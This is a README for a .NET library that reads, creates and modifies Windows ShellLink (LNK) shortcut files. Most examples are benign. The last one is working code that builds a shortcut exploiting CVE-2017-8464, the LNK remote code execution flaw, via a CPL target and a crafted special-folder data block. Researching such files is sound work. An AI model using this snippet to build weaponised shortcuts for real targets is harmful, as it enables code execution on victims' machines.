# ShellLink
A .NET Class Library for processing ShellLink (LNK) files as documented in [MS-SHLLINK](https://msdn.microsoft.com/en-us/library/dd871305.aspx). It allows for reading, creating and modifying ShellLink (LNK) files.

Note this Class Library depends on the [PropertyStore](https://github.com/securifybv/PropertyStore) Class Library.

## Examples

### Dump
```
Console.WriteLine(
	Shortcut.ReadFromFile(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk")
);
```

### Create
```
Shortcut.CreateShortcut(@"%SystemRoot%\System32\calc.exe")
	.WriteToFile(@"calc.lnk");
```

```
Shortcut.CreateShortcut(@"%SystemRoot%\System32\cmd.exe", 
	"/c calc.exe", 
	@"%SystemRoot%\System32\calc.exe", 0)
		.WriteToFile(@"calc2.lnk");
```

```
new Shortcut()
{
	LinkTargetIDList = new LinkTargetIDList()
	{
		Path = @"C:\Windows\System32\calc.exe"
	}
}.WriteToFile(@"calc3.lnk");
```

### Modify
```
Shortcut PowerShellLnk = Shortcut.ReadFromFile(
	Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk")
);
// change the background color
PowerShellLnk.ExtraData.ConsoleDataBlock.FillAttributes &= ~FillAttributes.BACKGROUND_BLUE;
PowerShellLnk.WriteToFile(@"PowerShell.lnk");
```

### CVE-2017-8464 | LNK Remote Code Execution Vulnerability
```
Shortcut lnk = new Shortcut()
{
	IconIndex = 0,
	LinkFlags = LinkFlags.IsUnicode,
	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl"),
};
lnk.ExtraData.SpecialFolderDataBlock = new SpecialFolderDataBlock()
{
	SpecialFolderID = 0x03,
	Offset = (UInt32)0x28
};
lnk.WriteToFile(@"CVE-2017-8464.lnk");
```